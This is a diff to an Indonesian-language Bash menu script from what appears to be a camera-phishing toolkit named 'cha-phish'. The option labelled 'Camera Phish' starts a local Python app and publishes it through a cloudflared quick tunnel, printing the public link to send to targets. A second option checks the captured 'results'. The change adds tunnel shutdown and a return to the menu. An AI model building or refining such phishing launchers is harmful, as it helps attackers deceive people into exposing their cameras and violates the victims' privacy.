@@ -33,7 +33,16 @@ read -p "➤ Pilih menu : " menu
 case $menu in
     1)
         echo -e "${YELLOW}🔥 Memulai Camera Phish...${NC}"
-        cd ~/cha-phish/"ai mamb" && python app.py > /dev/null 2>&1 & sleep 4 && cloudflared tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com'
+        echo -e "${YELLOW}📌 Tekan ${GREEN}ENTER${YELLOW} untuk kembali ke menu${NC}"
+        cd ~/cha-phish/"ai mamb" && python app.py > /dev/null 2>&1 & 
+        sleep 4
+        cloudflared tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
+        CLOUD_PID=$!
+        read -p ""
+        echo -e "\n${YELLOW}⏹ Menghentikan tunnel...${NC}"
+        kill $CLOUD_PID 2>/dev/null
+        pkill -f python 2>/dev/null
+        ~/cha-phish/cha-tools.sh
         ;;
     2)
         echo -e "${GREEN}▶ CEK HASIL${NC}"
